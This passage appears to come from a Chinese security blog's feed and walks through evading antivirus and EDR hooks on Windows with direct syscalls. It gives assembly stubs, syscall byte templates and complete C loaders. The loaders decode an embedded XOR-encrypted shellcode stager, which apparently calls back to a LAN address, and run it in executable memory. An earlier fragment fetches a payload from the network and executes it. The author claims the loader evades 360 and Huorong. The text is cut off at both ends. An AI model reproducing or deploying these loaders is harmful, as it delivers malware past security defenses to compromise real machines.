class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	LPVOID shellcode_addr = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">0x400000</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	DWORD dwRealWord;</span><br><span class="line">	BOOL response = InternetReadFile(hRequest, shellcode_addr, <span class="number">0x400000</span>, &amp;dwRealWord);</span><br><span class="line">	<span class="comment">//把shellcode_addr强制转换为一个返回void类型的函数指针然后执行</span></span><br><span class="line">    ((<span class="type">void</span>(*)())shellcode_addr)();</span><br><span class="line"></span><br><span class="line">	UnHook();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://macchiato.ink/hst/bypassav/VEH/#PVECTORED-EXCEPTION-HANDLER">https://macchiato.ink/hst/bypassav/VEH/#PVECTORED-EXCEPTION-HANDLER</a></p>
<p><a href="https://forum.butian.net/share/783">https://forum.butian.net/share/783</a></p>
<p><a href="https://xz.aliyun.com/t/9399">https://xz.aliyun.com/t/9399</a></p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/14742672.html">https://www.cnblogs.com/zpchcbd/p/14742672.html</a></p>
]]></content>
      <categories>
        <category>VEH</category>
      </categories>
      <tags>
        <tag>VEH</tag>
      </tags>
  </entry>
  <entry>
    <title>Syscall-使用系统调用规避杀软Hook</title>
    <url>/posts/b3138fd/</url>
    <content><![CDATA[<h3 id="Syscall"><a href="#Syscall" class="headerlink" title="Syscall"></a>Syscall</h3><p>x86 windows 使用 sysenter 实现系统调用，而x64 windows 使用 <strong>syscall</strong> 实现系统调用。<br>syscall已经成为了绕过AV/EDR所使用的主流方式，可以用它绕过一些敏感函数的调用监控(R3)。主流的AV/EDR都会对敏感函数进行HOOK，而syscall则可以用来绕过该类检测。<br>（可以通过<code>https://j00ru.vexillium.org/syscalls/nt/64/</code>查询各系统64位系统调用号<br> <code>https://j00ru.vexillium.org/syscalls/nt/32/</code> 查询各系统32位系统调用号）</p>
<h4 id="简单分析WindowsAPI调用过程"><a href="#简单分析WindowsAPI调用过程" class="headerlink" title="简单分析WindowsAPI调用过程"></a>简单分析WindowsAPI调用过程</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">VOID WINAPI <span class="title function_">Thread</span><span class="params">(LPVOID lpParam)</span></span><br><span class="line">&#123;</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Thread, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用process monitor 查看该进程调用过程 从CreateThread -&gt; CreateRemoteThreadEx -&gt;NtCreateThreadEx 最后进入内核<br><img src="/posts/b3138fd/1.png"></p>
<h4 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h4><p>使用IDA查看ntdll.dll<br>简单看下R3函数的底层实现</p>
<p>NtAllocateVirtualMemoryEx<br><img src="/posts/b3138fd/2.png"></p>
<p>NtWriteVirtualMemory<br><img src="/posts/b3138fd/3.png"></p>
<p>NtCreateThreadEx<br><img src="/posts/b3138fd/4.png"><br>这几个函数形式基本上都是一致的 ，只有系统调用号不同。将参数放入eax 的76h 为 ssdt表中的系统调用号中，然后再判断是否是syscall的方式进入内核，如果不支持就使用右边的调用方式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.code</span><br><span class="line">NtAllocateVirtualMemoryExProc proc</span><br><span class="line">	mov     r10, rcx    </span><br><span class="line">	mov     eax, 76h  ;将系统调用号存入eax  </span><br><span class="line">	syscall           ;进入内核层</span><br><span class="line">	ret</span><br><span class="line">NtAllocateVirtualMemoryExProc endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<h4 id="Syscall-1"><a href="#Syscall-1" class="headerlink" title="Syscall"></a>Syscall</h4><h5 id="基础的syscall代码实现"><a href="#基础的syscall代码实现" class="headerlink" title="基础的syscall代码实现"></a>基础的syscall代码实现</h5><p>将用到的API写到syscall.asm中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.code </span><br><span class="line">NtAllocateVirtualMemoryExProc proc</span><br><span class="line">mov     r10, rcx      </span><br><span class="line">mov     eax, 76h</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line">NtAllocateVirtualMemoryExProc endp</span><br><span class="line"></span><br><span class="line">NtWriteVirtualMemoryProc proc</span><br><span class="line">mov     r10, rcx        </span><br><span class="line">mov     eax, 03Ah</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line">NtWriteVirtualMemoryProc endp</span><br><span class="line"></span><br><span class="line">NtCreateThreadExProc proc</span><br><span class="line">mov     r10, rcx        </span><br><span class="line">mov     eax, 0C1h</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line">NtCreateThreadExProc endp</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>在该asm下属性中单独设置以下配置:<br>ml64 /c %(fileName).asm<br>%(fileName).obj;<br><img src="/posts/b3138fd/5.png"></p>
<p><img src="/posts/b3138fd/6.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">EXTERN_C NTSTATUS NTAPI <span class="title function_">NtAllocateVirtualMemoryExProc</span><span class="params">(</span></span><br><span class="line"><span class="params">	_In_opt_ HANDLE Process,</span></span><br><span class="line"><span class="params">	_In_opt_ PVOID* BaseAddress,</span></span><br><span class="line"><span class="params">	_In_ SIZE_T* RegionSize,</span></span><br><span class="line"><span class="params">	_In_ ULONG AllocationType,</span></span><br><span class="line"><span class="params">	_In_ ULONG PageProtection,</span></span><br><span class="line"><span class="params">	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,</span></span><br><span class="line"><span class="params">	_In_ ULONG ParameterCount</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line">EXTERN_C NTSTATUS NTAPI <span class="title function_">NtWriteVirtualMemoryProc</span><span class="params">(HANDLE ProcessHandle,PVOID BaseAddress,PVOID Buffer,ULONG BufferLength,PULONG ReturnLength OPTIONAL)</span>;</span><br><span class="line">EXTERN_C NTSTATUS NTAPI <span class="title function_">NtCreateThreadExProc</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown</span></span><br><span class="line"><span class="params">	)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtAllocateVirtualMemoryEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	_In_opt_ HANDLE Process,</span></span><br><span class="line"><span class="params">	_In_opt_ PVOID* BaseAddress,</span></span><br><span class="line"><span class="params">	_In_ SIZE_T* RegionSize,</span></span><br><span class="line"><span class="params">	_In_ ULONG AllocationType,</span></span><br><span class="line"><span class="params">	_In_ ULONG PageProtection,</span></span><br><span class="line"><span class="params">	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,</span></span><br><span class="line"><span class="params">	_In_ ULONG ParameterCount)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtWriteVirtualMemory)</span><span class="params">(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferLength, PULONG ReturnLength OPTIONAL)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown</span></span><br><span class="line"><span class="params">	)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异或后的shellcode</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xbe\x0a\xc1\xa6\xb2\xaa\x8a\x42\x42\x42\x03\x13\x03\x12\x10\x13\x14\x0a\x73\x90\x27\x0a\xc9\x10\x22\x0a\xc9\x10\x5a\x0a\xc9\x10\x62\x0a\xc9\x30\x12\x0a\x4d\xf5\x08\x08\x0f\x73\x8b\x0a\x73\x82\xee\x7e\x23\x3e\x40\x6e\x62\x03\x83\x8b\x4f\x03\x43\x83\xa0\xaf\x10\x03\x13\x0a\xc9\x10\x62\xc9\x00\x7e\x0a\x43\x92\x24\xc3\x3a\x5a\x49\x40\x37\x30\xc9\xc2\xca\x42\x42\x42\x0a\xc7\x82\x36\x25\x0a\x43\x92\x12\xc9\x0a\x5a\x06\xc9\x02\x62\x0b\x43\x92\xa1\x14\x0a\xbd\x8b\x03\xc9\x76\xca\x0a\x43\x94\x0f\x73\x8b\x0a\x73\x82\xee\x03\x83\x8b\x4f\x03\x43\x83\x7a\xa2\x37\xb3\x0e\x41\x0e\x66\x4a\x07\x7b\x93\x37\x9a\x1a\x06\xc9\x02\x66\x0b\x43\x92\x24\x03\xc9\x4e\x0a\x06\xc9\x02\x5e\x0b\x43\x92\x03\xc9\x46\xca\x0a\x43\x92\x03\x1a\x03\x1a\x1c\x1b\x18\x03\x1a\x03\x1b\x03\x18\x0a\xc1\xae\x62\x03\x10\xbd\xa2\x1a\x03\x1b\x18\x0a\xc9\x50\xab\x0d\xbd\xbd\xbd\x1f\x28\x42\x0b\xfc\x35\x2b\x2c\x2b\x2c\x27\x36\x42\x03\x14\x0b\xcb\xa4\x0e\xcb\xb3\x03\xf8\x0e\x35\x64\x45\xbd\x97\x0a\x73\x8b\x0a\x73\x90\x0f\x73\x82\x0f\x73\x8b\x03\x12\x03\x12\x03\xf8\x78\x14\x3b\xe5\xbd\x97\xa9\x31\x18\x0a\xcb\x83\x03\xfa\x6a\x41\x42\x42\x0f\x73\x8b\x03\x13\x03\x13\x28\x41\x03\x13\x03\xf8\x15\xcb\xdd\x84\xbd\x97\xa9\x1b\x19\x0a\xcb\x83\x0a\x73\x90\x0b\xcb\x9a\x0f\x73\x8b\x10\x2a\x42\x40\x02\xc6\x10\x10\x03\xf8\xa9\x17\x6c\x79\xbd\x97\x0a\xcb\x84\x0a\xc1\x81\x12\x28\x48\x1d\x0a\xcb\xb3\x0a\xcb\x98\x0b\x85\x82\xbd\xbd\xbd\xbd\x0f\x73\x8b\x10\x10\x03\xf8\x6f\x44\x5a\x39\xbd\x97\xc7\x82\x4d\xc7\xdf\x43\x42\x42\x0a\xbd\x8d\x4d\xc6\xce\x43\x42\x42\xa9\x91\xab\xa6\x43\x42\x42\xaa\xe0\xbd\xbd\xbd\x6d\x28\x08\x11\x14\x42\x2c\xaf\xcb\x27\xf3\xeb\x79\x89\x97\xe9\x9e\x82\x2b\x92\x89\x37\x1b\x18\x0f\xfb\x7f\x6f\x51\xaf\xd2\xe8\x4e\x3e\x46\xfd\xf9\x48\xbb\x8a\x77\x46\xa2\xae\x4b\x48\x90\xed\xd7\x70\xa0\xea\xe8\xff\x56\xcc\x0f\xa1\x60\xf5\x32\x38\xfc\x5f\xa5\x65\x08\xd6\x8d\x3c\x2e\x6d\xad\x5d\x3f\xa4\xe2\x00\x8a\x42\x17\x31\x27\x30\x6f\x03\x25\x27\x2c\x36\x78\x62\x0f\x2d\x38\x2b\x2e\x2e\x23\x6d\x77\x6c\x72\x62\x6a\x21\x2d\x2f\x32\x23\x36\x2b\x20\x2e\x27\x79\x62\x0f\x11\x0b\x07\x62\x7b\x6c\x72\x79\x62\x15\x2b\x2c\x26\x2d\x35\x31\x62\x0c\x16\x62\x74\x6c\x73\x79\x62\x16\x30\x2b\x26\x27\x2c\x36\x6d\x77\x6c\x72\x6b\x62\x0e\x00\x00\x10\x0d\x15\x11\x07\x10\x4f\x48\x42\x9a\xd8\x83\x80\x12\x4c\x94\x3e\x35\x26\x4a\xb4\x1b\x66\xd3\xf9\xcf\x15\x15\xb4\xef\x52\x8c\x9a\x93\x5d\xad\x04\x25\x97\x2d\xb4\xf4\x6b\xd4\x1e\xd0\x29\xd2\xfa\xfe\x7f\xf3\x29\xa5\x7e\x27\x1b\x09\x81\x60\x12\x17\x47\xf4\xe0\x34\x4c\xd6\x63\x50\xd5\x79\x95\x32\xbe\x75\x69\x28\x15\x36\x6a\xcf\xf8\xbe\x39\x5b\x9e\x23\x43\xce\xc1\x27\x85\x92\x80\x15\x54\x82\x47\x51\x33\x6e\x1a\x06\x6a\x59\xd3\xc5\xf4\xaa\x46\xed\xf7\x03\x57\x17\x93\xab\x39\xb4\xb2\xed\x09\x74\xb1\x25\x22\x32\xbb\xd2\x64\xee\xc9\x94\xb1\x31\x63\x57\x71\xe2\x44\x19\x71\x61\x5a\x72\x3d\xe9\x90\xd1\x7e\x81\x87\xf0\xe4\x8c\xe1\x0f\x57\xc4\xe2\xeb\x7b\x89\x64\x66\x34\x5a\x0b\xba\xc2\x9b\x3e\x4c\xc8\xfd\x8e\x31\xcc\xe9\x63\x04\x4c\x94\x15\xea\x63\xc6\xcd\x4c\xfa\xa1\xa4\x9c\x34\x86\x87\x1f\xe8\x37\x1c\x3e\xf8\xac\xac\xdd\x88\xc2\x73\xa2\x3b\x25\x3b\x81\x77\x18\x04\x8f\x97\xc2\x3b\xdf\x86\x89\x42\x03\xfc\xb2\xf7\xe0\x14\xbd\x97\x0a\x73\x8b\xf8\x42\x42\x02\x42\x03\xfa\x42\x52\x42\x42\x03\xfb\x02\x42\x42\x42\x03\xf8\x1a\xe6\x11\xa7\xbd\x97\x0a\xd1\x11\x11\x0a\xcb\xa5\x0a\xcb\xb3\x0a\xcb\x98\x03\xfa\x42\x62\x42\x42\x0b\xcb\xbb\x03\xf8\x50\xd4\xcb\xa0\xbd\x97\x0a\xc1\x86\x62\xc7\x82\x36\xf4\x24\xc9\x45\x0a\x43\x81\xc7\x82\x37\x95\x1a\x1a\x1a\x0a\x47\x42\x42\x42\x42\x12\x81\xaa\xdd\xbf\xbd\xbd\x73\x7b\x70\x6c\x73\x74\x7a\x6c\x73\x7a\x73\x6c\x73\x71\x70\x42\x78\x9c\x2a\xf3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">pNtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = (pNtAllocateVirtualMemoryEx)&amp;NtAllocateVirtualMemoryExProc;</span><br><span class="line">pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)&amp;NtWriteVirtualMemoryProc;</span><br><span class="line">pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)&amp;NtCreateThreadExProc;</span><br><span class="line">	LPVOID Address = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T uSize = <span class="number">0x1000</span>;</span><br><span class="line">	HANDLE hProcess = GetCurrentProcess();</span><br><span class="line">	NTSTATUS status = NtAllocateVirtualMemoryEx(hProcess, &amp;Address, &amp;uSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 还原异或</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++) &#123;</span><br><span class="line">		buf[i] ^= <span class="number">66</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	status = NtWriteVirtualMemory(hProcess, Address, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	NtCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)Address, <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上添加asm的代码也可以这样写，将asm中的代码改写放在以下形式main.cpp中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//syscall.asm</span><br><span class="line">CHAR NtAllocateVirtualMemoryExProc[] = &#123;</span><br><span class="line">	0x4c,0x8b,0xd1,   //mov r10,rcx</span><br><span class="line">	0xb8,0x76,0x00,0x00,0x00, //mov eax,076h</span><br><span class="line">	0x0f,0x05,   //syscall</span><br><span class="line">	0xc3   //ret</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CHAR NtWriteVirtualMemoryProc[] = &#123;</span><br><span class="line">	0x4c,0x8b,0xd1,   //mov r10,rcx</span><br><span class="line">	0xb8,0x3a,0x00,0x00,0x00, //mov eax,03Ah</span><br><span class="line">	0x0f,0x05,   //syscall</span><br><span class="line">	0xc3   //ret</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CHAR NtCreateThreadExProc[] = &#123;</span><br><span class="line">	0x4c,0x8b,0xd1,   //mov r10,rcx</span><br><span class="line">	0xb8,0xc1,0x00,0x00,0x00, //mov eax,0C1h</span><br><span class="line">	0x0f,0x05,   //syscall</span><br><span class="line">	0xc3   //ret</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>通过该方法 重新R3层API 杀软(用户态)就无法监控我们使用的API函数从而去bypass<br>动态静态可过360、火绒 （2022.11.26）<br><img src="/posts/b3138fd/7.png"><br><img src="/posts/b3138fd/8.png"></p>
<h5 id="动态读取ntdll-dll中函数获取系统调用号"><a href="#动态读取ntdll-dll中函数获取系统调用号" class="headerlink" title="动态读取ntdll.dll中函数获取系统调用号"></a>动态读取ntdll.dll中函数获取系统调用号</h5><p>对于不同的系统版本，进入内核的系统调用号都大不相同<br>所以前面手动去找函数的系统调用号的方法存在兼容性问题，需要对不同的系统做不同的处理。</p>
<p>流程:</p>
<ul>
<li><ol>
<li>通过GetProcAddress获取ntdll中的NtReadVirtualMemory 函数地址</li>
</ol>
</li>
<li><ol start="2">
<li>读取函数偏移0x04 获取系统调用号</li>
</ol>
</li>
<li><ol start="3">
<li>编写函数调用模板并填入系统调用号</li>
</ol>
</li>
<li><ol start="4">
<li>编写函数指针调用函数模板<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置动态获取ntdll中的函数系统调用号</span></span><br><span class="line">VOID <span class="title function_">SetSysCall</span><span class="params">(TCHAR* szFuncName)</span> &#123;</span><br><span class="line">	DWORD SysCallid = <span class="number">0</span>;</span><br><span class="line">	HMODULE hModule = GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hModule) &#123;   </span><br><span class="line">		DWORD64 FuncAddr = (DWORD64)GetProcAddress(hModule, (LPCSTR)szFuncName);</span><br><span class="line">		<span class="comment">//读取的基地址指向0xb8的地址</span></span><br><span class="line">		LPVOID CallAddr = (LPVOID)(FuncAddr + <span class="number">4</span>); </span><br><span class="line">		<span class="comment">//从0xb8开始读取2个字节</span></span><br><span class="line">		ReadProcessMemory(GetCurrentProcess(), CallAddr, &amp;SysCallid, <span class="number">2</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="comment">//复制2个字节到数组</span></span><br><span class="line">		<span class="built_in">memcpy</span>(FuncExample + <span class="number">4</span>, (CHAR*)&amp;SysCallid, <span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)<span class="comment">//.data段可执行</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数模板</span></span><br><span class="line">CHAR FuncExample[] = &#123;</span><br><span class="line">	<span class="number">0x4c</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,   <span class="comment">//mov r10,rcx</span></span><br><span class="line">	<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,0B9h</span></span><br><span class="line">	<span class="number">0x0f</span>,<span class="number">0x05</span>,   <span class="comment">//syscall</span></span><br><span class="line">	<span class="number">0xc3</span>   <span class="comment">//ret</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//初始化下 （写的有些丑陋了...）</span></span><br><span class="line">CHAR NtAllocateVirtualMemoryExProc[] = &#123; </span><br><span class="line">	<span class="number">0x4c</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,   <span class="comment">//mov r10,rcx</span></span><br><span class="line">	<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,0B9h</span></span><br><span class="line">	<span class="number">0x0f</span>,<span class="number">0x05</span>,   <span class="comment">//syscall</span></span><br><span class="line">	<span class="number">0xc3</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CHAR NtWriteVirtualMemoryProc[] = &#123; </span><br><span class="line">	<span class="number">0x4c</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,   <span class="comment">//mov r10,rcx</span></span><br><span class="line">	<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,0B9h</span></span><br><span class="line">	<span class="number">0x0f</span>,<span class="number">0x05</span>,   <span class="comment">//syscall</span></span><br><span class="line">	<span class="number">0xc3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CHAR NtCreateThreadExProc[] = &#123;</span><br><span class="line">	<span class="number">0x4c</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,   <span class="comment">//mov r10,rcx</span></span><br><span class="line">	<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,0B9h</span></span><br><span class="line">	<span class="number">0x0f</span>,<span class="number">0x05</span>,   <span class="comment">//syscall</span></span><br><span class="line">	<span class="number">0xc3</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtAllocateVirtualMemoryEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	_In_opt_ HANDLE Process,</span></span><br><span class="line"><span class="params">	_In_opt_ PVOID* BaseAddress,</span></span><br><span class="line"><span class="params">	_In_ SIZE_T* RegionSize,</span></span><br><span class="line"><span class="params">	_In_ ULONG AllocationType,</span></span><br><span class="line"><span class="params">	_In_ ULONG PageProtection,</span></span><br><span class="line"><span class="params">	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,</span></span><br><span class="line"><span class="params">	_In_ ULONG ParameterCount</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtWriteVirtualMemory)</span><span class="params">(</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	PVOID BaseAddress,</span></span><br><span class="line"><span class="params">	PVOID Buffer,</span></span><br><span class="line"><span class="params">	ULONG BufferLength,</span></span><br><span class="line"><span class="params">	PULONG ReturnLength OPTIONAL</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置获取函数的系统调用号</span></span><br><span class="line">VOID <span class="title function_">SetSysCall</span><span class="params">(TCHAR* szFuncName)</span> &#123;</span><br><span class="line">	DWORD SysCallid = <span class="number">0</span>;</span><br><span class="line">	HMODULE hModule = GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hModule) &#123;</span><br><span class="line">		DWORD64 FuncAddr = (DWORD64)GetProcAddress(hModule, (LPCSTR)szFuncName);</span><br><span class="line">		LPVOID CallAddr = (LPVOID)(FuncAddr + <span class="number">4</span>); <span class="comment">//读取的基地址指向0xb8的地址</span></span><br><span class="line">		ReadProcessMemory(GetCurrentProcess(), CallAddr, &amp;SysCallid, <span class="number">2</span>, <span class="literal">NULL</span>);<span class="comment">//从0xb8开始读取2个字节</span></span><br><span class="line">		<span class="built_in">memcpy</span>(FuncExample + <span class="number">4</span>, (CHAR*)&amp;SysCallid, <span class="number">2</span>);<span class="comment">//复制2个字节到数组</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异或后的shellcode</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span 